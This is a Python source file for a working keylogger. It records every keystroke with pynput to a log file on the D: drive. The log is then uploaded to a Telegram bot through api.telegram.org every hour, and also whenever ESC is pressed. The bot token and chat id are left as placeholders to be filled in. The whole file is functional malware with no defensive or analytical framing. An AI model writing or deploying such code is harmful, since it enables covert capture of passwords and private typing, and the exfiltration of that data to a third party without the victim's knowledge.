import os
import logging
import threading
import time
from pynput import keyboard
import requests

# Path
log_dir = "D:\\"
log_file = os.path.join(log_dir, "logs.txt")

# Keylogger run and save
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))
        if key == keyboard.Key.esc:
            # Run send_file when ESC is pressed
            send_file()
        elif key == keyboard.Key.f8:
            # Stop listener when F8 is pressed
            return False

def send_file():
    bot_token = 'BOT_TOKEN' # Add telegram bot token
    chat_id = 'Chat_ID' # Add telegram chat id
    file_path = log_file

    # URL API of Telegram
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

    try:
        # Open file and send
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id}
            requests.post(url, data=data, files=files)
    except Exception as e:
        pass

def send_file_periodically():
    while True:
        time.sleep(3600)  # Sleep for 1 hour
        send_file()

def run_keylogger():
    # Start the thread to send the file periodically
    send_thread = threading.Thread(target=send_file_periodically)
    send_thread.daemon = True
    send_thread.start()
    
    # Start listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    run_keylogger()
